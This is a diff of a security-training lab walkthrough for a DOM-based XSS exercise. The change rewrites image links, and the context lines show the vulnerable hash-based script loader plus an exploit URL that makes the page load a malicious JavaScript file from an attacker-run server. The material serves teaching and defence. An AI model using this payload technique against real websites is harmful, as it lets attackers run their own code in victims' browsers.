@@ -20,11 +20,11 @@ Now that the app is running let's go hacking!
 
 The application shows no input field or anything else we can interact with. Let's inspect the source code.
 
-![](../../.gitbook/assets/python/XSS-DOM-2/1.png)
+![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/python/XSS-DOM-2/1.png)
 
 Inspecting the source code of the application.
 
-![](../../.gitbook/assets/python/XSS-DOM-2/2.png)
+![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/python/XSS-DOM-2/2.png)
 
 ```javascript
 function loadWelcomeMessage() {
@@ -49,7 +49,7 @@ endpoint = location.hash.slice(5);
 
 Declaring endpoint variable which takes the url, whatever is after the hash(#) and using slice to remove the first 4 characters after that. If the endpoint exists it will load the js file from there.
 
-![](../../.gitbook/assets/python/XSS-DOM-2/3.png)
+![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/python/XSS-DOM-2/3.png)
 
 ## Exploitation
 
@@ -89,7 +89,7 @@ We are ready to start our server:
 $ python3 evil_server.py
 ```
 
-![](../../.gitbook/assets/python/XSS-DOM-2/4.png)
+![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/python/XSS-DOM-2/4.png)
 
 Now we can serve our malicious js file to the application
 
@@ -97,7 +97,7 @@ Now we can serve our malicious js file to the application
 http://0.0.0.0:5000/#xxxxhttp://0.0.0.0:1337
 ```
 
-![](../../.gitbook/assets/python/XSS-DOM-2/5.png)
+![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/python/XSS-DOM-2/5.png)
 
 ## Additional sources
 
